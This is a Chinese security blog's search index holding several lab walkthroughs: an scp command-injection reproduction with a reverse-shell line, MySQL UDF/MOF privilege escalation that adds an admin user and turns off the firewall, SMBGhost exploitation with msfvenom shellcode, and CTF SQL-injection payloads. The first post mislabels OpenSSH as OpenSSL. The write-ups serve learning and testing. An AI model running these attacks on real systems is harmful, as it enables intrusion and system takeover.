<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>CVE-2020-15778 OpenSSL漏洞复现</title>
    <url>/2021/04/10/CVE-2020-15778(OpenSSL)%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<h1 id="CVE-2020-15778-OpenSSL"><a href="#CVE-2020-15778-OpenSSL" class="headerlink" title="CVE-2020-15778 OpenSSL"></a>CVE-2020-15778 OpenSSL</h1><p><strong>影响版本</strong>：</p>
<blockquote>
<p>OpenSSH &lt;= 8.3p1 </p>
</blockquote>
<p><strong>漏洞介绍</strong></p>
<blockquote>
<p>漏洞公开披露2020年7月18日，openssh 8.3p1的SCP命令存在命令注入漏洞，攻击者可以利用此漏洞执行任意命令。</p>
</blockquote>
<p><strong>局限性</strong></p>
<blockquote>
<p>适用范围小，需要知道root用户密码，最大最用为ssh无法连接，但scp可以使用时</p>
</blockquote>
<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><blockquote>
<p>使用iptables策略搭建环境，禁用ssh登录，只保留scp(CentOS)</p>
</blockquote>
<ol>
<li><strong>关闭自带防火墙(firewalld)</strong></li>
</ol>
<pre class=" language-shell"><code class="language-shell">停止firewalld服务 
$ systemctl stop firewalld
</code></pre>
<ol start="2">
<li><strong>设置iptables策略</strong></li>
</ol>
<pre class=" language-shell"><code class="language-shell">service iptables start
iptables -t filter -A INPUT -p tcp --dport 22 -m tos --tos 0x10 -j DROP
service iptables save
iptables -L -n --line-number 
</code></pre>
<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210224210808492.png" alt="image-20210224210808492"></p>
<p><strong>验证</strong></p>
<blockquote>
<p>scp功能正常使用，但是ssh在输入密码后，无任何回响，无法连接，证明iptables策略成功有效。</p>
</blockquote>
<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210224211255664.png" alt="image-20210224211255664"></p>
<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210224211123362.png" alt="image-20210224211123362"></p>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p><strong>在kali里面新建1.sh，写入反弹shell的bash命令</strong></p>
<pre class=" language-shell"><code class="language-shell">bash -i >& /dev/tcp/10.7.5.120>&1
</code></pre>
<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210224211415668.png" alt="image-20210224211415668"></p>
<p><strong>kali监听6666端口</strong></p>
<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210224211522082.png" alt="image-20210224211522082"></p>
<p><strong>使用scp命令传输文件到CentOS的/tmp目录</strong></p>
<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210224211630066.png" alt="image-20210224211630066"></p>
<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210224211703168.png" alt="image-20210224211703168"></p>
<p><strong>命令执行，运行1.sh</strong></p>
<pre class=" language-shell"><code class="language-shell">scp 1.sh root@192.168.1.135:/'`sh /tmp/1.sh`'
</code></pre>
<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210224211800626.png" alt="image-20210224211800626"></p>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><blockquote>
<p>scp命令源码</p>
</blockquote>
<pre class=" language-shell"><code class="language-shell">if (remin == -1) &#123;
    xasprintf(&bp, "%s -t %s%s", cmd,
        *targ == '-' ? "-- " : "", targ);
    if (do_cmd(thost, tuser, tport, bp, &remin,
        &remout) < 0)
        exit(1);
    if (response() < 0)
        exit(1);
    free(bp);
&#125;
</code></pre>
<p><strong>当执行本地scp命令时，scp不会检查、过滤和清除文件名。这使得攻击者执行带有反引号的有效scp命令时，本地shell还将执行反引号中的命令。</strong></p>
<h2 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h2><p>补丁/升级</p>
]]></content>
      <tags>
        <tag>OpenSSL</tag>
        <tag>复现</tag>
      </tags>
  </entry>
  <entry>
    <title>MySQL提权</title>
    <url>/2021/04/11/MySQL%E6%8F%90%E6%9D%83/</url>
    <content><![CDATA[<h1 id="MySQL提权"><a href="#MySQL提权" class="headerlink" title="MySQL提权"></a>MySQL提权</h1><blockquote>
<p>流程：服务探针——信息收集——提权利用——获取权限</p>
</blockquote>
<p><strong>提权前提：</strong>获取数据库最高管理员的账户密码</p>
<ul>
<li>读取网站数据库配置文件（了解其命名规则及查找技巧）</li>
</ul>
<pre><code>sql、data、inc、config、conn、database、common、include
</code></pre>
<ul>
<li>读取数据库存储或备份文件（了解数据库存储格式及对应内容）</li>
</ul>
<pre><code>@@basedir/data/数据库名/表名.MYD    (表内容)
</code></pre>
<ul>
<li>暴力破解（了解数据库是否支持外联及如何开启外联）</li>
</ul>
<h2 id="UDF提权"><a href="#UDF提权" class="headerlink" title="UDF提权"></a>UDF提权</h2><p>利用root权限，创建带有调用cmd函数的<code>udf.dll</code>(动态链接库)。当我们把<code>udf.dll</code>导出指定文件夹引入MySQL时，其中的调用函数拿出来当作MySQL的函数使用。这样我们自定义的函数才被当作本机函数执行。在使用<code>CREAT FUNCITON</code>调用dll中的函数后，MySQL账号转化为system权限，从而来提权。</p>
<blockquote>
<p>MySQL &lt; 5.1    <code>udf.dll</code>文件在Windows2003下放置于<code>c:\windows\system32</code>，在windows2000下放置于<code>c:\winnt\system32</code>。</p>
<p>MySQL =&gt; 5.1    <code>udf.dll</code>文件必须放置于<code>MYSQL安装目录下的lib\plugin</code>文件夹下。</p>
</blockquote>
<p><strong>查看数据库服务版本信息</strong></p>
<pre class=" language-mysql"><code class="language-mysql">select @@version;
select version();
</code></pre>
<p><strong>查看数据库安装目录</strong></p>
<pre class=" language-mysql"><code class="language-mysql">select @@basedir;
select basedir();
</code></pre>
<p><strong>查看MySQL安装路径</strong></p>
<pre class=" language-mysql"><code class="language-mysql">show variables like '%plugins%'; 
</code></pre>
<p><strong>利用<code>NTFS ADS</code>创建<code>lib</code>目录</strong></p>
<pre class=" language-mysql"><code class="language-mysql">select 'x' into dumpfile '安装目录\\lib::$INDEX_ALLOCATION';
</code></pre>
<p><strong>利用<code>NTFS ADS</code>创建<code>plugin</code>目录</strong></p>
<pre class=" language-mysql"><code class="language-mysql">select 'x' into dumpfile '安装目录\\lib\\plugin::$INDEX_ALLOCATION';
</code></pre>
<p><strong>UDF提权文件所在位置</strong></p>
<p>msf的UDF文件原C++函数没有写异常处理，那么MySQL加载的时候会使MySQL出错导致断开连接。</p>
<blockquote>
<p>metasploit下的动态链接库</p>
</blockquote>
<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210410101535951.png" alt="image-20210410101535951"></p>
<blockquote>
<p>sqlmap下的动态链接库</p>
</blockquote>
<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210410101703903.png" alt="image-20210410101703903"></p>
<blockquote>
<p>sqlmap下的4个UDF文件是经过编码的，如果直接丢在MySQL的<code>plugin</code>目录下是无法加载的，需要用<code>sqlmap/extra/cloak/cloak.py</code>进行解码</p>
</blockquote>
<pre class=" language-shell"><code class="language-shell">python .\cloak.py -d -i ..\..\data\udf\mysql\windows\64\lib_mysqludf_sys.dll_ -o lib_mysqludf_sys.dll
</code></pre>
<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210410101854163.png" alt="image-20210410101854163"></p>
<p><strong>导出<code>dll</code>到指定目录</strong></p>
<p>可以使用msf中<code>mysql_udf_payload</code>模块</p>
<blockquote>
<p>条件：</p>
<p><code>secure_auth=YES</code>    (运行导出文件)</p>
<p><code>secure_file_prive=空</code>    (可以导出任意文件到任意位置)</p>
</blockquote>
<p><strong>查看是否允许文件导出导入</strong></p>
<pre class=" language-mysql"><code class="language-mysql">show variables like "%secure%";
</code></pre>
<p><strong>导出<code>dll</code></strong></p>
<pre class=" language-mysql"><code class="language-mysql">select 'lib_mysqludf_sys.dll' into outfile '安装目录/lib/pulgin/udf.dll';
</code></pre>
<p><strong>创建<code>cmdshell</code> 函数</strong> (该函数叫什么名字在后续中则使用该函数进行查询)</p>
<pre class=" language-mysql"><code class="language-mysql">create function cmdshell returns string soname 'udf.dll';

# [AGGREATE]是聚集函数的表示，系统定义的聚集函数比如有COUNT()、AVE()、MN()、MAX()、SUM()
# SONAME 'file'表示这个函数从哪个文件里面引入，而这个文件一般是动态链接库，windows下是dll，linux是so，并且这个文件要在mysql的plugin目录下
</code></pre>
<p><strong>执行命令</strong></p>
<pre class=" language-mysql"><code class="language-mysql">select cmdshell('whoami');
# 关闭windows防火墙和筛选
select cmdshell('net stop policyagent');     
select cmdshell('net stop sharedaccess');
select cmdshell('netsh advfirewall set allprofiles state off');
</code></pre>
<p><strong><code>udf.dll</code>下常见函数</strong></p>
<pre class=" language-shell"><code class="language-shell">cmdshell     //执行cmd;
downloader     //下载者,到网上下载指定文件并保存到指定目录;
open3389     //通用开3389终端服务,可指定端口(不改端口无需重启);
backshell     //反弹Shell;
ProcessView //枚举系统进程;
KillProcess //终止指定进程;
regread     //读注册表;
regwrite     //写注册表;
shut         //关机,注销,重启;
about         //说明与帮助函数;
</code></pre>
<h2 id="MOF提权"><a href="#MOF提权" class="headerlink" title="MOF提权"></a>MOF提权</h2><p>MOF是windows系统的一个文件（在<code>c:/windows/system32/wbem/mof/nullevt.mof</code>）叫做<code>托管对象格式</code>其作用是每隔五秒就会去监控进程创建和死亡。</p>
<p>其实就是用了MySQL的root权限了以后，然后使用root权限去执行我们上传的MOF。隔了一定时间以后这个MOF就会被执行，这个MOF当中有一段是vbs脚本，这个vbs大多数的是cmd的添加管理员用户的命令。</p>
<p><strong>MOF提权过程:</strong></p>
<ol>
<li>将MOF上传至任意可读可写目录下</li>
<li>更改MOF文件代码</li>
</ol>
<pre class=" language-shell"><code class="language-shell">#pragma namespace("\\\\.\\root\\subscription") 

instance of __EventFilter as $EventFilter 
&#123; 
    EventNamespace = "Root\\Cimv2"; 
    Name  = "filtP2"; 
    Query = "Select * From __InstanceModificationEvent " 
            "Where TargetInstance Isa \"Win32_LocalTime\" " 
            "And TargetInstance.Second = 5"; 
    QueryLanguage = "WQL"; 
&#125;; 

instance of ActiveScriptEventConsumer as $Consumer 
&#123; 
    Name = "consPCSV2"; 
    ScriptingEngine = "JScript"; 
    ScriptText = 
    "var WSH = new ActiveXObject(\"WScript.Shell\")\nWSH.run(\"net.exe user admin admin /add\")"; 
&#125;; 

instance of __FilterToConsumerBinding 
&#123; 
    Consumer   = $Consumer; 
    Filter = $EventFilter; 
&#125;;
</code></pre>
<ol start="3">
<li>使用SQL语句将系统当中默认的<code>nullevt.mof</code>给替换掉</li>
</ol>
<pre class=" language-mysql"><code class="language-mysql">select load_file('D:\wamp\xishaonian.mof') into dumpfile 'c:/windows/system32/wbem/mof/nullevt.mof';
</code></pre>
<h3 id="MSF进行MOF提权"><a href="#MSF进行MOF提权" class="headerlink" title="MSF进行MOF提权"></a>MSF进行MOF提权</h3><blockquote>
<p>Msf下的<code>exploit/windows/mysql/mysql_mof</code>模块提供了直接MOF提权，不过该漏洞成功跟操作系统权限和MySQL数据库版本有关，执行成功后会直接反弹shell到meterpreter。</p>
</blockquote>
<pre class=" language-shell"><code class="language-shell">use exploit/windows/mysql/mysql_mof
set rhost IP //设置需要提权的远程主机IP地址
set rport 3306 //设置mysql的远程端口
set password root //设置mysql数据库root密码
set username root //设置mysql用户名
show options //查看设置
exploit
</code></pre>
<blockquote>
<p>MySQL允许远程root登入</p>
</blockquote>
<pre class=" language-mysql"><code class="language-mysql">一:
use mysql;
update user set host = '%' where user = 'root';
FLUSH PRIVILEGES ;
二:
GRANT ALL PRIVILEGES ON . TO 'root'@'%' IDENTIFIED BY 'youpassword' WITH GRANT OPTION;
FLUSH PRIVILEGES;
</code></pre>
<h2 id="启动项提权"><a href="#启动项提权" class="headerlink" title="启动项提权"></a>启动项提权</h2><blockquote>
<p>导出自定义可执行文件到启动目录配合重启执行</p>
<p>将创建好的后门或执行文件进行服务器启动项写入,配合重启执行</p>
</blockquote>
<p><strong>MSF进行启动项提权</strong></p>
<pre class=" language-shell"><code class="language-shell">use exploit/windows/mysql/mysql_start_up
set rhost IP //设置需要提权的远程主机IP地址
set rport 3306 //设置mysql的远程端口
set password root //设置mysql数据库root密码
set username root //设置mysql用户名
show options //查看设置
exploit
</code></pre>
<p><a href="https://xz.aliyun.com/t/2719">Windows下三种MySQL提权剖析</a></p>
<p><a href="https://www.cnblogs.com/yzloo/p/10390916.html">MySQL数据库渗透及漏洞利用总结</a></p>
<p><a href="https://www.cnblogs.com/xishaonian/p/6384535.html">mof提权原理及其过程</a></p>
]]></content>
      <tags>
        <tag>MySQL</tag>
        <tag>提权</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE-2020-0796（永恒之黑)漏洞复现</title>
    <url>/2021/04/10/CVE_2020_0796(%E6%B0%B8%E6%81%92%E4%B9%8B%E9%BB%91)%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<h1 id="CVE-2020-0796（永恒之黑"><a href="#CVE-2020-0796（永恒之黑" class="headerlink" title="CVE-2020-0796（永恒之黑)"></a>CVE-2020-0796（永恒之黑)</h1><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><blockquote>
<p>SMB远程代码执行漏洞</p>
<p>SMB 3.1.1协议中处理压缩消息时，对其中数据没有经过安全检查，直接使用会引发内存破坏漏洞，可能被攻击者利用远程执行任意代码。攻击者利用该漏洞无需权限即可实现远程代码执行，受黑客攻击的目标系统只需要开机在线就有可能被入侵</p>
<p>Windows 10和Windows Server 2016引入了SMB 3.1.1，本次漏洞源于SMBv3没有正确处理压缩的数据包，在解压数据包的时候使用客户端传过来的长度进行解压时，并没有检查长度是否合法，最终导致整数溢出</p>
<p>利用该漏洞，黑客可直接远程攻击SMB服务端远程执行恶意代码，也可以通过构建恶意SMB服务端诱导客户端连接从而大规模攻击客户端</p>
</blockquote>
<h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><pre><code>Windows 10 Version 1903 for 32-bit Systems
Windows 10 Version 1903 for x64-based Systems
Windows 10 Version 1903 for ARM64-based Systems
Windows Server, Version 1903 (Server Core installation)
Windows 10 Version 1909 for 32-bit Systems
Windows 10 Version 1909 for x64-based Systems
Windows 10 Version 1909 for ARM64-based Systems
Windows Server, Version 1909 (Server Core installation)
</code></pre>
<p><strong>漏洞复现工具下载</strong></p>
<p>漏洞检测工具：<a href="http://dl.qianxin.com/skylar6/CVE-2020-0796-Scanner.zip">http://dl.qianxin.com/skylar6/CVE-2020-0796-Scanner.zip</a></p>
<p>攻击poc：<a href="https://github.com/eerykitty/CVE-2020-0796-PoC">https://github.com/eerykitty/CVE-2020-0796-PoC</a></p>
<p>shell脚本：<a href="https://github.com/chompie1337/SMBGhost_RCE_PoC">https://github.com/chompie1337/SMBGhost_RCE_PoC</a></p>
<h2 id="蓝屏复现"><a href="#蓝屏复现" class="headerlink" title="蓝屏复现"></a>蓝屏复现</h2><p><strong>环境</strong></p>
<pre><code>目标机：Windows 10 1903     ip: 10.7.1.111（虚拟机）
攻击机：Windows 10 20H2        ip: 10.7.6.254（物理机）
</code></pre>
<ol>
<li><strong>将目标机的防火墙关闭</strong></li>
<li><strong>在攻击机上对目标机进行检测，看其是否存在漏洞。</strong></li>
</ol>
<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210224165146258.png" alt="image-20210224165146258"></p>
<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210224165221346.png" alt="image-20210224165221346"></p>
<ol start="3">
<li><strong>利用下载的poc脚本发起攻击</strong></li>
</ol>
<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210224165539611.png" alt="image-20210224165539611"></p>
<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210224165647306.png" alt="image-20210224165647306"></p>
<h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><p><strong>环境</strong></p>
<pre><code>目标机：Windows 10 1903     ip: 10.7.1.111（虚拟机）
攻击机：Windows 10 20H2        ip: 10.7.6.254（物理机）
</code></pre>
<ol>
<li><strong>生成一个反弹木马</strong></li>
</ol>
<pre class=" language-shell"><code class="language-shell">msfvenom -p windows/x64/meterpreter/bind_tcp LPORT=8888 -b '\x00' -i 1 -f python

   说明: 
   #-p payload
   #-e 编码方式
   #-i 编码次数
   #-b 过滤坏字符
   #LHOST,LPORT 监听上线的主机IP和端口
   #-f python 生成python格式
   #‘\x00‘转义字符，对应ascall码中为null，因为是二进制文件所以会出现，在python中作为结束的标志，有点相当于%00截断的感觉。
</code></pre>
<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210224170157500.png" alt="image-20210224170157500"></p>
<ol start="2">
<li><strong>用生成的shellcode将shell脚本工具里面的exploit.py中的user_payload替换掉。保留前面的名字，只替换内容</strong></li>
</ol>
<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210224170414954.png" alt="image-20210224170414954"></p>
<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210224170436001.png" alt="image-20210224170436001"></p>
<ol start="3">
<li><strong>开启msf监听模块</strong></li>
</ol>
<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210224170630883.png" alt="image-20210224170630883"></p>
<ol start="4">
<li><strong>运行exploit.py脚本，发起攻击反弹shell</strong></li>
</ol>
<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210224171104264.png" alt="image-20210224171104264"></p>
<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210224171704173.png" alt="image-20210224171704173"></p>
<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210224171715265.png" alt="image-20210224171715265"></p>
<blockquote>
<p>这个脚本有点问题，要多试几次才能得到shell，不用着急。这个脚本有时候会把靶机打蓝屏，重启一下靶机就好了，继续执行脚本知道得到shell。</p>
</blockquote>
]]></content>
      <tags>
        <tag>复现</tag>
        <tag>Windows 10</tag>
        <tag>SMB</tag>
      </tags>
  </entry>
  <entry>
    <title>2019强网杯 随便注</title>
    <url>/2021/04/25/%5B%E5%BC%BA%E7%BD%91%E6%9D%AF%202019%5D%E9%9A%8F%E4%BE%BF%E6%B3%A8/</url>
    <content><![CDATA[<h2 id="2019-强网杯-随便注"><a href="#2019-强网杯-随便注" class="headerlink" title="[2019 强网杯]随便注"></a>[2019 强网杯]随便注</h2><p><strong>访问题目站点，随便输入就能看到返回结果</strong></p>
<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210105155916668.png" alt="image-20210105155916668"></p>
<p><strong>输入<code>&#39;</code>测试是否存在注入点</strong></p>
<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210105155958771.png" alt="image-20210105155958771"></p>
<blockquote>
<p>发现报错，可以猜测此注入为字符型注入</p>
</blockquote>
<p><strong>构造SQL语句返回能查看的所有值</strong></p>
<pre class=" language-php"><code class="language-php"><span class="token number">1</span>' <span class="token keyword">or</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span><span class="token shell-comment comment">#</span>
</code></pre>
<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210105160146124.png" alt="image-20210105160146124"></p>
<p><strong>爆出所在表字段数</strong></p>
<pre class=" language-php"><code class="language-php"><span class="token number">1</span>' order by <span class="token number">2</span><span class="token shell-comment comment">#        </span><span class="token comment" spellcheck="true">//正常回显</span>
<span class="token number">1</span>' order by <span class="token number">3</span><span class="token shell-comment comment">#        </span><span class="token comment" spellcheck="true">//出现报错</span>
</code></pre>
<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210105160103617.png" alt="image-20210105160103617"></p>
<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210105160123586.png" alt="image-20210105160123586"></p>
<blockquote>
<p>证明有2个字段</p>
</blockquote>
<p><strong>尝试爆所在数据库</strong></p>
<pre class=" language-php"><code class="language-php"><span class="token number">1</span>' union select <span class="token function">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token shell-comment comment">#</span>
</code></pre>
<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210105160226584.png" alt="image-20210105160226584"></p>
<blockquote>
<p>返回了一串代码，说明<code>select</code>函数被过滤</p>
<p>那么<code>select union</code>查询就无法使用了</p>
</blockquote>
<h3 id="堆栈注入"><a href="#堆栈注入" class="headerlink" title="堆栈注入"></a><strong>堆栈注入</strong></h3><p><strong>堆叠注入(堆叠查询，Stacked Queries)</strong></p>
<p>堆叠注入为攻击者提供了很多控制权，与仅限于SELECT语句的UNION联合查询攻击不同，<strong>堆叠注入可以用于执行任何SQL语句。</strong></p>
<h4 id="堆叠注入原理"><a href="#堆叠注入原理" class="headerlink" title="堆叠注入原理"></a>堆叠注入原理</h4><p>在SQL中，分号表示一条语句的结束。如果在分号的后面再加一条语句，这条语句也可以被执行，继续加一个分号和一条语句，这样就可以在一次数据库的调用中执行多个语句。</p>
<h4 id="堆叠注入的局限性"><a href="#堆叠注入的局限性" class="headerlink" title="堆叠注入的局限性"></a>堆叠注入的局限性</h4><p>堆叠注入并不是在每种情况下都能使用的。大多数时候，因为API或数据库引擎的不支持，堆叠注入都无法实现。</p>
<p><strong>查看所有数据库</strong></p>
<pre class=" language-php"><code class="language-php"><span class="token operator">-</span><span class="token number">1</span>'<span class="token punctuation">;</span>show databases<span class="token punctuation">;</span><span class="token shell-comment comment">#</span>
</code></pre>
<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210105160301517.png" alt="image-20210105160301517"></p>
<p><strong>查看当前数据库下的所有表</strong></p>
<pre class=" language-php"><code class="language-php"><span class="token number">1</span>'<span class="token punctuation">;</span>show tables<span class="token punctuation">;</span><span class="token shell-comment comment">#</span>
</code></pre>
<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210105160324351.png" alt="image-20210105160324351"></p>
<p><strong>查看表结构</strong></p>
<pre class=" language-php"><code class="language-php"><span class="token operator">-</span><span class="token number">1</span>'<span class="token punctuation">;</span>desc `<span class="token number">1919810931114514</span>`<span class="token punctuation">;</span>desc `words`<span class="token shell-comment comment">#</span>
</code></pre>
<blockquote>
<p>在windows系统下，反单引号（`）是数据库、表、索引、列和别名用的引用符</p>
</blockquote>
<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210105160412946.png" alt="image-20210105160412946"></p>
<blockquote>
<p><strong>发现flag在<code>1919810931114514</code>表里</strong></p>
</blockquote>
<p><strong>判断出查询语句</strong></p>
<pre class=" language-php"><code class="language-php">selsect id<span class="token punctuation">,</span>data from words where id <span class="token operator">=</span> <span class="token operator">?</span>
</code></pre>
<h4 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h4><pre class=" language-php"><code class="language-php"><span class="token number">0</span>'<span class="token punctuation">;</span>rename table words to words1<span class="token punctuation">;</span>rename table `<span class="token number">1919810931114514</span>` to words<span class="token punctuation">;</span>alter table words change flag id <span class="token function">varchar</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span> <span class="token constant">CHARACTER</span> <span class="token constant">SET</span> utf8 <span class="token constant">COLLATE</span> utf8_general_ci <span class="token constant">NOT</span> <span class="token keyword">NULL</span><span class="token punctuation">;</span>desc  words<span class="token punctuation">;</span><span class="token shell-comment comment">#</span>
</code></pre>
<blockquote>
<p><strong>由于可以堆叠查询，这时候就想到了一个改名的方法</strong></p>
<p><strong>把words随便改成words1，然后把1919810931114514改成words，再把列名flag改成id，结合上面的1’ or 1=1#爆出表所有内容就可以查flag啦</strong></p>
</blockquote>
<p><strong><code>1&#39;or 1=1#</code>爆出表所有内容</strong></p>
<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210105160530680.png" alt="image-20210105160530680"></p>
<h3 id="预处理语句"><a href="#预处理语句" class="headerlink" title="预处理语句"></a>预处理语句</h3><pre class=" language-php"><code class="language-php"><span class="token constant">PREPARE</span> name from <span class="token string">'[mysql sequece]'</span><span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">//预定义SQL语句</span>
<span class="token constant">EXECUTE</span> name<span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//执行预定义SQL语句</span>
<span class="token punctuation">(</span><span class="token constant">DEALLOCATE</span> <span class="token operator">||</span> <span class="token constant">DROP</span><span class="token punctuation">)</span> <span class="token constant">PREPARE</span> name<span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//删除预定义SQL        语句</span>
</code></pre>
<p><strong>预定义语句也可以通过变量进行传递</strong></p>
<pre class=" language-php"><code class="language-php"><span class="token constant">SET</span> @tn <span class="token operator">=</span> <span class="token string">'hahaha'</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//存储表名</span>
<span class="token constant">SET</span> @sql <span class="token operator">=</span> <span class="token function">concat</span><span class="token punctuation">(</span><span class="token string">'select * from '</span><span class="token punctuation">,</span> @tn<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//存储SQL语句</span>
<span class="token constant">PREPARE</span> name from @sql<span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">//预定义SQL语句</span>
<span class="token constant">EXECUTE</span> name<span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//执行预定义SQL语句</span>
<span class="token punctuation">(</span><span class="token constant">DEALLOCATE</span> <span class="token operator">||</span> <span class="token constant">DROP</span><span class="token punctuation">)</span> <span class="token constant">PREPARE</span> sqla<span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//删除预定义SQL语句</span>
</code></pre>
<h4 id="payload-1"><a href="#payload-1" class="headerlink" title="payload"></a>payload</h4><p>利用 char() 函数将select的ASCII码转换为select字符串，接着利用concat()函数进行拼接得到select查询语句，从而绕过过滤。或者直接用concat()函数拼接select来绕过。</p>
<blockquote>
<p><strong>不使用变量</strong></p>
</blockquote>
<pre class=" language-php"><code class="language-php"><span class="token number">1</span><span class="token string">';PREPARE hacker from concat(char(115,101,108,101,99,116), '</span> <span class="token operator">*</span> from `<span class="token number">1919810931114514</span>` '<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token constant">EXECUTE</span> hacker<span class="token punctuation">;</span><span class="token shell-comment comment">#</span>
</code></pre>
<blockquote>
<p><strong>使用变量</strong></p>
</blockquote>
<pre class=" language-php"><code class="language-php"><span class="token number">1</span><span class="token string">';SET @sqli=concat(char(115,101,108,101,99,116),'</span><span class="token operator">*</span> from `<span class="token number">1919810931114514</span>`'<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token constant">PREPARE</span> hacker from @sqli<span class="token punctuation">;</span><span class="token constant">EXECUTE</span> hacker<span class="token punctuation">;</span><span class="token shell-comment comment">#</span>
</code></pre>
<blockquote>
<p><strong>只是用contact(),不使用char()</strong></p>
</blockquote>
<pre class=" language-php"><code class="language-php"><span class="token number">1</span><span class="token string">';PREPARE hacker from concat('</span>s<span class="token string">','</span>elect<span class="token string">', '</span> <span class="token operator">*</span> from `<span class="token number">1919810931114514</span>` '<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token constant">EXECUTE</span> hacker<span class="token punctuation">;</span><span class="token shell-comment comment">#</span>
</code></pre>
<h1 id="参考文档"><a href="#参考文档" class="headerlink" title="参考文档"></a>参考文档</h1><p><a href="https://www.cnblogs.com/yingmo/p/6148360.html">MySQL中concat函数</a></p>
<p><a href="https://blog.csdn.net/u010002184/article/details/79354136?utm_medium=distribute.pc_aggpage_search_result.none-task-blog-2~aggregatepage~first_rank_v2~rank_v29-1-79354136.nonecase&utm_term=%E4%BF%AE%E6%94%B9mysql%20%E5%AD%97%E6%AE%B5%E5%90%8D&spm=1000.2123.3001.4430">Mysql修改字段名、修改字段类型</a></p>
]]></content>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP代码审计基础概念</title>
    <url>/2021/04/10/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%A6%82%E8%BF%B0/</url>
    <content><![CDATA[<h1 id="PHP代码审计"><a href="#PHP代码审计" class="headerlink" title="PHP代码审计"></a>PHP代码审计</h1><h3 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h3><h4 id="代码编辑器"><a href="#代码编辑器" class="headerlink" title="代码编辑器"></a>代码编辑器</h4><ul>
<li>Notepad++</li>
<li>Visual Studio Code</li>
</ul>
<h4 id="代码审计工具"><a href="#代码审计工具" class="headerlink" title="代码审计工具"></a>代码审计工具</h4><ul>
<li>Seay源代码审计系统</li>
<li>Firtufy SCA</li>
<li>RIPS</li>
</ul>
<h4 id="漏洞验证辅助"><a href="#漏洞验证辅助" class="headerlink" title="漏洞验证辅助"></a>漏洞验证辅助</h4><ul>
<li>BurpSuite Community</li>
<li>浏览器扩展</li>
<li>编码转换、加密解密工具 </li>
<li>正则调试工具</li>
<li>SQL执行监控工具</li>
</ul>
<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><blockquote>
<ol>
<li>检查铭感函数的参数，然后回溯变量，判断变量是否可控并且没有经过严格的过滤（逆向追踪）</li>
<li>找出哪些文件在接收外部传入的参数，然后跟踪变量的传递过程，观察是否有变量传入到高危函数中，或者传递的过程中是否有代码逻辑漏洞（正向追踪）</li>
<li>直接挖掘功能点漏洞，根据自身的禁言判断该类应用通常在哪些功能中会出现漏洞，直接全篇阅读该功能代码</li>
</ol>
<ul>
<li>学好代码审计需要掌握一下几点<ul>
<li>PHP编程语言的特性和基础</li>
<li>Web前端编程基础</li>
<li>漏洞形成原理</li>
<li>代码审计思路</li>
